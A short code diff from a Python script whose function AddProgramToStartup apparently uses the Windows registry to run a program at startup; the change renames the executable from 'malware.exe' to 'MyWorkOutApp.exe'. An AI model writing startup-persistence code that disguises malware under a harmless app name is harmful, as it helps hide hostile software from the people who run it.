@@ -8,7 +8,7 @@ from winreg import *
 def AddProgramToStartup():
 
     fp=os.path.dirname(os.path.realpath(__file__))
-    file_name ="malware.exe"
+    file_name ="MyWorkOutApp.exe"
     dist = "dist"
 
     new_file_path = fp+"\\"+dist+"\\"+file_name
